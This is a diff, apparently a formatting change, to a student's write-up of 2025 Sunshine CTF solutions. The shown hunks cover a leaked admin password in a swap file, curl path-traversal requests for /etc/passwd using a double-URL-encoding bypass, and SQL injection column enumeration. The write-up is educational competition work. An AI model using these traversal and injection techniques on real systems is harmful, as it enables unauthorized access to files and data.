@@ -3,17 +3,17 @@ title: "2025 Sunshine CTF Solutions Writeup"
 description:
   "A writeup of all my solutions for the 2025 Sunshine CTF challenges."
 pubDate: "September 30 2025"
-heroImage: "/thumbs/home server.webp"
+heroImage: "/thumbs/sunshine-ctf-2025.webp"
 tags: ["cybersecurity"]
 ---
 
 This fall, as part of the DukeSec club, I participated in the 2025
 [Sunshine CTF](https://sunshinectf.org/). CTFs (aka Capture the Flag) are a
-competition where participants are faced with a set of cybersecurity
-challenges, in which they try to "hack" the system and gain access to sensitive
-knowledge (the flag). Our team placed 59th overall out of over 1,000 teams. With
-the conclusion of the competition, I'll be sharing my solutions, thought
-process, and key takeaways.
+competition where participants are faced with a set of cybersecurity challenges,
+in which they try to "hack" the system and gain access to sensitive knowledge
+(the flag). Our team placed 59th overall out of over 1,000 teams. With the
+conclusion of the competition, I'll be sharing my solutions, thought process,
+and key takeaways.
 
 ![DukeSec placing 59th of over 1000 teams](../../images/SunshineCTF-2025/ctf-overview.webp)
 
@@ -27,8 +27,8 @@ process, and key takeaways.
 1. [Lunar Shop (WEB)](#lunar-shop)
 1. [Intergalatic Copyright Infringement (FORENSICS)](#intergalatic-copyright-infringement)
 
-Click on one of the above links to read about a specific solution. Don't know where to
-start? Just start reading down to see them all.
+Click on one of the above links to read about a specific solution. Don't know
+where to start? Just start reading down to see them all.
 
 # Lunar File Invasion
 
@@ -84,35 +84,35 @@ But, there's this `.gitignore_test` file. Let's check that out.
 I think our boy Muhammad might've forgotten to rename this file. This gives us
 even more pointers! Many text editors leave out "swap" files which contain your
 latest changes, even without you hitting save. This exists so that if your PC
-crashes or you lose power, your edits can still be recovered by reading the
-swap file. Let's take a look at one of these files:
+crashes or you lose power, your edits can still be recovered by reading the swap
+file. Let's take a look at one of these files:
 
 ```html
 ❯ curl "https://asteroid.sunshinectf.games/index/static/login.html~"
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Admin Panel</title>
-</head>
-<body>
+  </head>
+  <body>
     <div>
-        <img src="" alt="Image of Alien">
-        <form action="{{url_for('index.login')}}" method="POST">
-            <!-- TODO: use proper clean CSS stylesheets bruh -->
-            <p style="color: red;"> {{ err_msg }} </p>
-            <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
-            <label for="Email">Email</label>
-            <input value="admin@lunarfiles.muhammadali" type="text" name="email">
+      <img src="" alt="Image of Alien" />
+      <form action="{{url_for('index.login')}}" method="POST">
+        <!-- TODO: use proper clean CSS stylesheets bruh -->
+        <p style="color: red;">{{ err_msg }}</p>
+        <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
+        <label for="Email">Email</label>
+        <input value="admin@lunarfiles.muhammadali" type="text" name="email" />
 
-            <label for="Password">Password</label>
-            <!-- just to save time while developing, make sure to remove this in prod !  -->
-            <input value="jEJ&(32)DMC<!*###" type="text" name="password">
-            <button type="submit">Login</button>
-        </form>
+        <label for="Password">Password</label>
+        <!-- just to save time while developing, make sure to remove this in prod !  -->
+        <input value="jEJ&(32)DMC<!*###" type="text" name="password" />
+        <button type="submit">Login</button>
+      </form>
     </div>
-</body>
+  </body>
 </html>
 ```
 
@@ -135,10 +135,10 @@ vulnerabilities. But what if we can bypass this 2FA page? Remember the earlier
 get access the dashboard, even without entering valid 2FA credentials. Seems
 like they forgot to enforce the 2FA page they created.
 
-On this dashboard, we can visit the files page where we see a list of files
-in a platform somewhat resembling Google Drive or other cloud storage
-solutions. With inspect element, we can take a peek at how the page loads
-each file when we click it.
+On this dashboard, we can visit the files page where we see a list of files in a
+platform somewhat resembling Google Drive or other cloud storage solutions. With
+inspect element, we can take a peek at how the page loads each file when we
+click it.
 
 ![Chrome webtools](../../images/SunshineCTF-2025/lunar-03.webp)
 
@@ -158,13 +158,17 @@ number of `../`'s to be confident we can traverse all the way to the filesystem
 root.
 
 ```html
-❯ curl -b 'session=session_cookie_here' --path-as-is https://asteroid.sunshinectf.games/admin/download/../../../../../../../../../../../etc/passwd
+❯ curl -b 'session=session_cookie_here' --path-as-is
+https://asteroid.sunshinectf.games/admin/download/../../../../../../../../../../../etc/passwd
 <html>
-<head><title>400 Bad Request</title></head>
-<body>
-<center><h1>400 Bad Request</h1></center>
-<hr><center>nginx/1.24.0 (Ubuntu)</center>
-</body>
+  <head>
+    <title>400 Bad Request</title>
+  </head>
+  <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr />
+    <center>nginx/1.24.0 (Ubuntu)</center>
+  </body>
 </html>
 ```
 
@@ -187,18 +191,19 @@ form, but will also decode any URL-encoded segments. This means we can't simply
 URL-encode the path to bypass this:
 
 ```html
-~
-❯ echo "../../../../../../../../../../../etc/passwd" | jq -Rr @uri
-..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
-
-~
-❯ curl -b 'session=session_cookie' --path-as-is https://asteroid.sunshinectf.games/admin/download/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+~ ❯ echo "../../../../../../../../../../../etc/passwd" | jq -Rr @uri
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd ~ ❯ curl -b
+'session=session_cookie' --path-as-is
+https://asteroid.sunshinectf.games/admin/download/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 <html>
-<head><title>400 Bad Request</title></head>
-<body>
-<center><h1>400 Bad Request</h1></center>
-<hr><center>nginx/1.24.0 (Ubuntu)</center>
-</body>
+  <head>
+    <title>400 Bad Request</title>
+  </head>
+  <body>
+    <center><h1>400 Bad Request</h1></center>
+    <hr />
+    <center>nginx/1.24.0 (Ubuntu)</center>
+  </body>
 </html>
 ```
 
@@ -207,17 +212,23 @@ off the documentation excerpt though, it seems like NGINX will only decode once.
 So, what if we URL encode our path twice?
 
 ```html
-~
-❯ echo "../../../../../../../../../../../etc/passwd" | jq -Rr @uri | jq -Rr @uri
+~ ❯ echo "../../../../../../../../../../../etc/passwd" | jq -Rr @uri | jq -Rr
+@uri
 ..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
-
-~
-❯ curl -b 'session=session_cookie' --path-as-is https://asteroid.sunshinectf.games/admin/download/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
+~ ❯ curl -b 'session=session_cookie' --path-as-is
+https://asteroid.sunshinectf.games/admin/download/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd
 <!doctype html>
-<html lang=en>
-<title>Redirecting...</title>
-<h1>Redirecting...</h1>
-<p>You should be redirected automatically to the target URL: <a href="/admin/lunar_files?err_msg=%5B+Succession+of+&#39;../../&#39;+detected,+forbidden+%5D">/admin/lunar_files?err_msg=%5B+Succession+of+&#39;../../&#39;+detected,+forbidden+%5D</a>. If not, click the link.
+<html lang="en">
+  <title>Redirecting...</title>
+  <h1>Redirecting...</h1>
+  <p>
+    You should be redirected automatically to the target URL:
+    <a
+      href="/admin/lunar_files?err_msg=%5B+Succession+of+&#39;../../&#39;+detected,+forbidden+%5D"
+      >/admin/lunar_files?err_msg=%5B+Succession+of+&#39;../../&#39;+detected,+forbidden+%5D</a
+    >. If not, click the link.
+  </p>
+</html>
 ```
 
 Another error, but this time it's not NGINX! That means we are now talking
@@ -821,7 +832,7 @@ not careful!
 >
 > PEGASUS file for this challenge
 >
->  - CanYouHearMe.peg
+> - CanYouHearMe.peg
 >
 > Core PEGASUS v3 files:
 >
@@ -835,24 +846,27 @@ not careful!
 > - PEGASUS.md
 >
 > How to run a PEGASUS file:
+>
 > ```
 > runpeg <file.peg> [--debug] [--verbose] [--trace]
 > ```
+>
 > There are more options you can find with runpeg --help :)
 
-This one was quite simple, as it was just to test that you have correctly setup your environment.
+This one was quite simple, as it was just to test that you have correctly setup
+your environment.
 
 ```
 ./runpeg CanYouHearMe.peg
 ```
 
 And that would give you the flag. For some context, PEGASUS is a custom
-instruction set made specifically for this competition. They provided
-documents on the ISA including the registers available and the opcodes.
+instruction set made specifically for this competition. They provided documents
+on the ISA including the registers available and the opcodes.
 
-As the competition progressed, the CTF hosts uploaded more PEGASUS
-challenges, but at the time that I was solving them, they had not
-yet released other challenges.
+As the competition progressed, the CTF hosts uploaded more PEGASUS challenges,
+but at the time that I was solving them, they had not yet released other
+challenges.
 
 # Lunar Shop
 
@@ -953,10 +967,10 @@ When ordering by the 5th column, we get
 ```
 
 This error here reveals that we have exactly four columns. Based off the
-information on the site, it's likely the ones we identified earlier: id,
-name, description, price. That leaves no extra columns to identify mark
-products as released or unreleased. That means the unreleased products
-are likely in a different table altogether.
+information on the site, it's likely the ones we identified earlier: id, name,
+description, price. That leaves no extra columns to identify mark products as
+released or unreleased. That means the unreleased products are likely in a
+different table altogether.
 
 This time, lets be a little more methodical with this, rather than
 brute-forcing. Many SQL servers have a table that stores the columns for other
@@ -1006,9 +1020,9 @@ And that's it! we get our flag.
 **To developers:**
 
 SQL Injections are one of the oldest vulnerabilities on the web. Always use
-parameterized queries (prepared statements), which treat user input as data,
-not as executable code. This is the most effective way to prevent SQL
-injection vulnerabilities.
+parameterized queries (prepared statements), which treat user input as data, not
+as executable code. This is the most effective way to prevent SQL injection
+vulnerabilities.
 
 # Intergalatic Copyright Infringement
 
@@ -1133,7 +1147,7 @@ capture and decode whatever is being sent.
 Thanks for reading this far! I had a lot of fun trying these challenges out.
 This CTF is my first ever official CTF, and I think I performed pretty well!
 
-A recurring theme was the danger of hidden complexity in seemingly simple
-tools, a lesson that applies far beyond CTFs. Commands like `less` and apps
-like `tmux` may seem straightforward and single-purpose, but have many fronts
-that all need to be checked when building an application around them.
+A recurring theme was the danger of hidden complexity in seemingly simple tools,
+a lesson that applies far beyond CTFs. Commands like `less` and apps like `tmux`
+may seem straightforward and single-purpose, but have many fronts that all need
+to be checked when building an application around them.
